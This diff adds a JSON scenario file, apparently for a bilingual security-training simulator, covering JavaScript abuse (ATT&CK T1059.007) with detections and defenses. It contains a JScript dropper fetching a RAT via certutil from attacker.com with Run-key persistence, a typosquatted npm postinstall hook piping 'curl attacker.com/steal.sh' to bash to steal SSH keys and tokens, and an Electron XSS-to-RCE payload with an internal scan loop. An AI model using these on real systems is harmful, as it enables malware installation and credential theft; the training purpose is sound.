@@ -1,0 +1,131 @@
+{
+  "id": "T1059.007",
+  "title": "JavaScript 악용 시뮬레이션",
+  "titleEn": "JavaScript Exploitation Simulation",
+  "duration": 6,
+  "phases": [
+    { "label": "📜 JScript 드로퍼", "labelEn": "📜 JScript Dropper", "steps": [0] },
+    { "label": "📦 npm 악성 패키지", "labelEn": "📦 npm Malicious Pkg", "steps": [1] },
+    { "label": "🎯 Electron RCE", "labelEn": "🎯 Electron RCE", "steps": [2] },
+    { "label": "🔍 탐지 & 방어", "labelEn": "🔍 Detection & Defense", "steps": [3] }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker\n(C2)", "x": 50, "y": 80 },
+    { "id": "email", "label": "Phishing\nEmail (.js)", "x": 200, "y": 30 },
+    { "id": "victim", "label": "Victim PC\n(wscript)", "x": 200, "y": 130 },
+    { "id": "npm", "label": "npm Registry\n(Malicious)", "x": 370, "y": 80 },
+    { "id": "internal", "label": "Internal\nNetwork", "x": 500, "y": 80 }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "email", "minStep": 0 },
+    { "from": "email", "to": "victim", "minStep": 0 },
+    { "from": "attacker", "to": "npm", "minStep": 1 },
+    { "from": "victim", "to": "internal", "minStep": 2 }
+  ],
+  "desktopIcons": [
+    { "name": "wscript", "icon": "📜" },
+    { "name": "Node.js", "icon": "🟢" },
+    { "name": "npm", "icon": "📦" },
+    { "name": "Electron", "icon": "⚛️" },
+    { "name": "SIEM", "icon": "📊" }
+  ],
+  "steps": [
+    {
+      "cmd": "// JScript 드로퍼 (invoice.js)\nvar shell = new ActiveXObject('WScript.Shell');\nvar fs = new ActiveXObject('Scripting.FileSystemObject');\n\n// 페이로드 다운로드\nshell.Run('certutil -urlcache -f http://attacker.com/rat.exe C:\\\\Temp\\\\svc.exe', 0, true);\n\n// 레지스트리 지속성\nshell.RegWrite('HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\svc', 'C:\\\\Temp\\\\svc.exe');\n\n// 실행\nshell.Run('C:\\\\Temp\\\\svc.exe', 0);",
+      "out": "[JScript 실행]\n사용자가 invoice.js 더블클릭\n→ wscript.exe가 자동 실행\n\n[페이로드 다운로드]\ncertutil → rat.exe 다운로드 (345KB)\n→ C:\\Temp\\svc.exe 저장\n\n[레지스트리 지속성]\nHKCU\\...\\Run\\svc = C:\\Temp\\svc.exe\n→ 시스템 재시작 시 자동 실행 ⚠️\n\n[RAT 실행]\nsvc.exe 백그라운드 실행\n→ C2 서버 연결 완료 ⚠️\n\n⚠️ 피싱 .js → 다운로드 → 지속성 → RAT",
+      "def": "[EDR] wscript.exe spawning certutil — JScript dropper downloading executable from external URL",
+      "defAction": "Tool: wscript.exe + JScript\nPayload: rat.exe via certutil (345KB)\nPersistence: Registry Run key\nC2: Active connection established\nRisk Level: Critical\nAction: Block .js file association, enable AMSI",
+      "desc": "피싱 이메일의 invoice.js를 더블클릭하면 wscript.exe가 실행되어 certutil로 RAT를 다운로드하고 레지스트리 Run 키로 지속성을 확보합니다.",
+      "descEn": "Double-clicking invoice.js in phishing email triggers wscript.exe, downloads RAT via certutil, establishes persistence via Registry Run key.",
+      "stepTitle": "JScript 드로퍼 + 레지스트리 지속성",
+      "stepTitleEn": "JScript Dropper + Registry Persistence",
+      "feynman": "'청구서 확인'이라고 적힌 편지(invoice.js)를 열면, 내장된 지시서(JScript)가 자동으로 실행됩니다. 도둑 도구(RAT)를 다운받고, 매일 자동으로 문을 열도록(Run 키) 설정합니다.",
+      "feynmanEn": "Opening a letter labeled 'invoice' (invoice.js) auto-executes embedded instructions (JScript). Downloads burglar tools (RAT) and sets up daily auto-opening (Run key).",
+      "expert": "Windows에서 .js 파일의 기본 연결은 wscript.exe입니다. ActiveXObject를 통해 WScript.Shell(명령 실행), Scripting.FileSystemObject(파일 조작), MSXML2.XMLHTTP(네트워크) 등 시스템 리소스에 접근합니다. AMSI(Antimalware Scan Interface)로 JScript 내용을 검사할 수 있습니다.",
+      "expertEn": "Windows .js files default to wscript.exe. ActiveXObject provides WScript.Shell (commands), FileSystemObject (files), XMLHTTP (network). AMSI can inspect JScript content before execution.",
+      "defTooltip": "🔐 JScript 드로퍼 + RAT 설치!",
+      "defTooltipEn": "🔐 JScript dropper + RAT installed!",
+      "hackerLog": { "title": "dropper.log", "lines": ["[09:00:00] invoice.js 더블클릭", "[09:00:02] certutil 다운로드", "[09:00:05] 레지스트리 지속성", "[09:00:08] RAT C2 연결"] },
+      "terms": [
+        { "term": "JScript", "def": "Microsoft의 JavaScript 구현, wscript.exe를 통해 Windows에서 .js 파일 실행" },
+        { "term": "AMSI", "def": "Antimalware Scan Interface, 스크립트 엔진과 AV 간 인터페이스로 악성 코드 검사" }
+      ]
+    },
+    {
+      "cmd": "// npm 악성 패키지 (postinstall 악용)\n// package.json\n{\n  \"name\": \"lodahs\",  // lodash 타이포스쿼팅\n  \"scripts\": {\n    \"postinstall\": \"node -e \\\"require('child_process').exec('curl attacker.com/steal.sh|bash')\\\"\"\n  }\n}\n\n// 설치 시 자동 실행\nnpm install lodahs",
+      "out": "[npm 패키지 설치]\nnpm WARN deprecated lodahs@1.0.0\n\n> lodahs@1.0.0 postinstall\n> node -e \"require('child_process').exec('curl attacker.com/steal.sh|bash')\"\n\n[postinstall 실행]\n→ steal.sh 다운로드 + 실행\n→ ~/.ssh/id_rsa 탈취 ⚠️\n→ ~/.npmrc (auth token) 탈취 ⚠️\n→ 환경변수 (API keys) 전송 ⚠️\n\n[npm audit]\nadded 1 package in 2s\n1 critical vulnerability\n\n⚠️ npm 타이포스쿼팅 → SSH키 + API키 탈취",
+      "def": "[SIEM] npm postinstall executing external script — credential theft from developer workstation",
+      "defAction": "Tool: npm postinstall script\nPackage: lodahs (typosquatting lodash)\nStolen: SSH key, npmrc token, API keys\nMethod: child_process.exec → curl | bash\nRisk Level: Critical\nAction: Use --ignore-scripts, npm audit, internal registry",
+      "desc": "lodash를 타이포스쿼팅한 lodahs 패키지의 postinstall 스크립트가 SSH 키, npmrc 토큰, 환경변수의 API 키를 탈취합니다.",
+      "descEn": "Typosquatted 'lodahs' package postinstall script steals SSH keys, npmrc tokens, and API keys from environment variables.",
+      "stepTitle": "npm 타이포스쿼팅 + postinstall 공격",
+      "stepTitleEn": "npm Typosquatting + postinstall Attack",
+      "feynman": "인기 있는 공구(lodash)와 이름이 거의 같은 가짜 공구(lodahs)를 만듭니다. 설치하면 자동으로 '사은품 증정(postinstall)' 행사가 시작되며, 실제로는 집 열쇠(SSH키)와 금고 비밀번호(API키)를 복사합니다.",
+      "feynmanEn": "Create fake tools (lodahs) nearly identical to popular ones (lodash). Installation triggers 'free gift (postinstall)' event that actually copies house keys (SSH) and vault codes (API keys).",
+      "expert": "npm의 postinstall 스크립트는 패키지 설치 직후 자동 실행됩니다. --ignore-scripts 옵션으로 차단할 수 있습니다. .npmrc에는 npm registry 인증 토큰이 저장되어 있어 탈취 시 패키지 배포 권한을 얻을 수 있습니다.",
+      "expertEn": "npm postinstall scripts run automatically after package installation. --ignore-scripts blocks them. .npmrc contains registry auth tokens — theft enables package publishing.",
+      "defTooltip": "🔐 npm 공급망 공격!",
+      "defTooltipEn": "🔐 npm supply chain attack!",
+      "hackerLog": { "title": "npm.log", "lines": ["[09:10:00] npm install lodahs", "[09:10:05] postinstall 실행", "[09:10:10] SSH 키 탈취", "[09:10:15] API 키 전송"] },
+      "terms": [
+        { "term": "postinstall", "def": "npm 패키지 설치 후 자동 실행되는 스크립트, 공급망 공격에 악용" },
+        { "term": ".npmrc", "def": "npm 설정 파일, registry 인증 토큰 포함 (탈취 시 패키지 배포 가능)" }
+      ]
+    },
+    {
+      "cmd": "// Electron 앱 XSS → RCE\n// nodeIntegration: true인 Electron 앱에서\n<img src=x onerror=\"require('child_process').exec('calc.exe')\">\n\n// Node.js SSRF → 내부 스캔\nconst http = require('http');\nfor(let i=1; i<=254; i++) {\n  http.get(`http://10.0.0.${i}:8080`, (res) => {\n    console.log(`${i}: ${res.statusCode}`);\n  }).on('error', ()=>{});\n}",
+      "out": "[Electron XSS → RCE]\nBrowserWindow nodeIntegration: true ⚠️\n→ XSS 페이로드 삽입\n→ require('child_process') 접근 성공\n→ calc.exe 실행 (PoC)\n→ 시스템 명령 실행 가능 ⚠️\n\n[Node.js 내부 스캔]\n10.0.0.10:8080 → 200 (Jenkins)\n10.0.0.20:8080 → 200 (Tomcat)\n10.0.0.30:8080 → 연결 거부\n10.0.0.50:8080 → 200 (Spring Boot)\n\n⚠️ Electron RCE + 3대 내부 서버 발견",
+      "def": "[EDR] Electron app spawning system processes — XSS to RCE via nodeIntegration, internal network scanning",
+      "defAction": "Tool: Electron (nodeIntegration) + Node.js\nXSS: img onerror → child_process\nRCE: System command execution\nScan: 3 internal servers on 8080\nRisk Level: Critical\nAction: Disable nodeIntegration, enable contextIsolation",
+      "desc": "nodeIntegration이 활성화된 Electron 앱에서 XSS를 통해 시스템 명령을 실행합니다. Node.js로 내부 네트워크를 스캔하여 3대 서버를 발견합니다.",
+      "descEn": "Execute system commands via XSS in Electron app with nodeIntegration enabled. Scan internal network with Node.js, discover 3 servers.",
+      "stepTitle": "Electron XSS→RCE + 내부 스캔",
+      "stepTitleEn": "Electron XSS→RCE + Internal Scan",
+      "feynman": "웹 브라우저(Electron)가 시스템 접근 카드(nodeIntegration)를 가지고 있습니다. 웹페이지에 속임수(XSS)를 넣으면, 브라우저의 카드로 시스템 전체를 조종할 수 있습니다.",
+      "feynmanEn": "The web browser (Electron) has a system access card (nodeIntegration). Tricking the webpage (XSS) lets you use the browser's card to control the entire system.",
+      "expert": "Electron의 nodeIntegration: true는 렌더러 프로세스에서 Node.js API에 직접 접근을 허용합니다. contextIsolation: true를 설정하면 preload 스크립트를 통해서만 Node.js에 접근할 수 있습니다. Electron v12부터 contextIsolation이 기본 활성화됩니다.",
+      "expertEn": "Electron nodeIntegration: true allows direct Node.js API access in renderer. contextIsolation: true restricts Node.js access to preload scripts only. Default in Electron v12+.",
+      "defTooltip": "🔐 Electron RCE + 내부 스캔!",
+      "defTooltipEn": "🔐 Electron RCE + internal scan!",
+      "hackerLog": { "title": "electron.log", "lines": ["[09:20:00] XSS 페이로드 삽입", "[09:20:03] child_process 접근", "[09:20:05] 시스템 명령 실행", "[09:20:10] 내부 스캔 3대 발견"] },
+      "terms": [
+        { "term": "nodeIntegration", "def": "Electron 설정, true 시 렌더러에서 Node.js API 직접 접근 (보안 위험)" },
+        { "term": "contextIsolation", "def": "Electron 보안 설정, preload만 Node.js 접근 허용하여 XSS→RCE 차단" }
+      ]
+    },
+    {
+      "cmd": "// JavaScript 방어 종합\n// .js 파일 연결 변경\nassoc .js=txtfile\nftype txtfile=notepad.exe %1\n\n// npm 보안 설정\nnpm config set ignore-scripts true\nnpm audit fix --force\n\n// Electron 보안 설정\nnew BrowserWindow({ webPreferences: { nodeIntegration: false, contextIsolation: true } });",
+      "out": "[.js 파일 연결 변경]\n✅ .js → notepad.exe (실행 차단)\n✅ .jse → 실행 차단\n✅ .wsf → 실행 차단\n✅ AppLocker JScript 정책\n\n[npm 보안]\n✅ --ignore-scripts 기본 설정\n✅ npm audit CI/CD 통합\n✅ 내부 npm registry 사용\n✅ package-lock.json 해시 검증\n\n[Electron 보안]\n✅ nodeIntegration: false\n✅ contextIsolation: true\n✅ sandbox: true\n✅ CSP 헤더 적용\n\n[추가 방어]\n✅ AMSI JScript 검사 활성화\n✅ wscript/cscript 실행 차단 (GPO)\n✅ EDR JavaScript 행위 탐지\n✅ SRI(Subresource Integrity) 적용",
+      "def": "[SIEM] JavaScript defense deployed — file association changed, npm hardened, Electron secured, AMSI enabled",
+      "defAction": "Tool: File association + npm config + Electron + AMSI\nFile: .js/.jse/.wsf → notepad\nnpm: ignore-scripts, internal registry\nElectron: contextIsolation + sandbox\nAMSI: JScript content inspection\nRisk Level: Low (with implementation)\nAction: Quarterly npm audit, Electron security review",
+      "desc": ".js 파일 연결을 메모장으로 변경하고, npm --ignore-scripts를 기본 설정합니다. Electron contextIsolation과 AMSI를 활성화하여 JavaScript 악용을 차단합니다.",
+      "descEn": "Change .js file association to notepad, default npm --ignore-scripts. Enable Electron contextIsolation and AMSI to block JavaScript abuse.",
+      "stepTitle": "파일 연결 + npm 보안 + Electron + AMSI",
+      "stepTitleEn": "File Association + npm Security + Electron + AMSI",
+      "feynman": "4가지 대책: 1) 편지(js)를 열면 메모장에서만 보이게(파일 연결 변경), 2) 택배(npm) '사은품' 자동 실행 차단(ignore-scripts), 3) 브라우저(Electron)에서 시스템 카드 회수(contextIsolation), 4) 모든 스크립트를 보안검사(AMSI).",
+      "feynmanEn": "4 measures: 1) Letters (js) only open in text viewer (file association), 2) Block auto-gift from packages (ignore-scripts), 3) Revoke system card from browser (contextIsolation), 4) Security scan all scripts (AMSI).",
+      "expert": "Windows에서 assoc 명령으로 파일 확장자 연결을 변경할 수 있습니다. npm의 --ignore-scripts는 preinstall, install, postinstall 스크립트 실행을 차단합니다. Electron의 contextIsolation은 preload 스크립트에서만 Node.js API에 접근하도록 격리합니다.",
+      "expertEn": "Windows assoc command changes file extension associations. npm --ignore-scripts blocks preinstall/install/postinstall. Electron contextIsolation restricts Node.js API access to preload scripts.",
+      "defTooltip": "🔐 JavaScript 방어 완성!",
+      "defTooltipEn": "🔐 JavaScript defense complete!",
+      "hackerLog": { "title": "defense.log", "lines": ["[10:00:00] .js 파일 연결 변경", "[10:05:00] npm ignore-scripts 설정", "[10:10:00] Electron 보안 적용", "[10:15:00] AMSI 활성화"] },
+      "terms": [
+        { "term": "SRI", "def": "Subresource Integrity, 외부 스크립트 해시를 검증하여 변조 방지" },
+        { "term": "assoc", "def": "Windows 파일 확장자 연결 관리 명령어" }
+      ]
+    }
+  ],
+  "processTree": {
+    "name": "wscript.exe (invoice.js)",
+    "pid": 3000,
+    "children": [
+      {
+        "name": "certutil.exe (-urlcache)",
+        "pid": 3100,
+        "children": [
+          { "name": "svc.exe (RAT)", "pid": 3110, "children": [] }
+        ]
+      }
+    ]
+  }
+}
